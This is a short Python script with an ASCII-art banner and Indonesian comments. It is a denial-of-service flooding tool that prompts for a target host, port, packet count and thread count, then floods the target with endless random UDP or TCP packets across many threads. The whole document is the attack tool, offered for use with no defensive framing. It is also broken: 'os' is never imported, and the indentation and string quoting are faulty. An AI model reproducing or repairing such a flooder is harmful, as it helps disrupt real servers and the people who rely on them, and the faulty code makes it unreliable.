#!/usr/bin/env python3
#Yahh Tertangkap gwa
#Manfactured By Mostoas
import random
import socket
import threading
import time

os.system("clear") 
    
    print("\033[1;34;40m

░█████╗░██████╗░██████╗░██╗░░░██╗
██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝
███████║██║░░██║██║░░██║░╚████╔╝░
██╔══██║██║░░██║██║░░██║░░╚██╔╝░░
██║░░██║██████╔╝██████╔╝░░░██║░░░
╚═╝░░╚═╝╚═════╝░╚═════╝░░░░╚═╝░░░


██╗░░██╗██╗░░██╗██████╗░██████╗░
╚██╗██╔╝╚██╗██╔╝██╔══██╗██╔══██╗
░╚███╔╝░░╚███╔╝░██████╦╝██████╔╝
░██╔██╗░░██╔██╗░██╔══██╗██╔══██╗
██╔╝╚██╗██╔╝╚██╗██████╦╝██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝") 

ip = str(input(" Host Or IP:"))
port = int(input(" Port:"))
choice = str(input(" GASS UDEPEHNYA?(y/n):"))
times = int(input(" Package:"))
threads = int(input(" Threads:"))
def run():
  data = random._urandom(1081)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print("\033[1;34;40m=>Addy×XXBR") 
    except:
      print("Error Banhh!!")

def run2():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Sent!!!")
    except:
      s.close()
      print("[*] Error")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()